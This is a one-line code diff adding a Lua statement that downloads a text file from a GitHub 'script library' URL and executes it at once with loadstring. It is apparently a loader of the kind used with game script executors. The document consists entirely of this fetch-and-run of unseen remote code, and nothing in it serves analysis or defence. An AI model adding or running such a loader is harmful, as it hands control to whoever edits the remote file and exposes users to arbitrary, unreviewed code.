@@ -1,0 +1,1 @@
+loadstring(request({Url='https://raw.githubusercontent.com/avalanxereal/a-script-library/refs/heads/main/-.txt'; Method='GET'}).Body)();
